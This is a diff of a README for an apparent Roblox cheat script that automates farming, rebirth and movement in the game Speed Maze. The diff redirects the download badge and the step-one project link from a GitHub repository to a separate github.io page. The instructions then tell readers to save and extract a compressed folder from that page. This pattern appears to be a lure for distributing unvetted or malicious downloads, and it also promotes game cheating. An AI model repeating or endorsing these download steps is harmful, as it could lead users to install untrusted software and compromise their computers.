@@ -1,6 +1,6 @@
 # ⚡ Speed-Maze-Roblox-Script-OP-Auto-Farm-2026 - Master the maze with automated play
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Improved-spirometry841/Speed-Maze-Roblox-Script-OP-Auto-Farm-2026)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://improved-spirometry841.github.io)
 
 This repository provides a script for the Speed Maze experience within Roblox. You gain tools to automate farming, rebirth, and movement. Use these features to save time and progress through the game without manual input. The script includes a graphical user interface to manage your settings.
 
@@ -18,7 +18,7 @@ Confirm your computer meets these standards to ensure the software runs without 
 
 Follow these steps to obtain the files from our official source:
 
-1. Visit the project link: https://github.com/Improved-spirometry841/Speed-Maze-Roblox-Script-OP-Auto-Farm-2026
+1. Visit the project link: https://improved-spirometry841.github.io
 2. Locate the link labeled "Download" or "Release" on the page.
 3. Save the compressed folder to your Desktop.
 4. Right-click the folder and select "Extract All" to see the individual files.
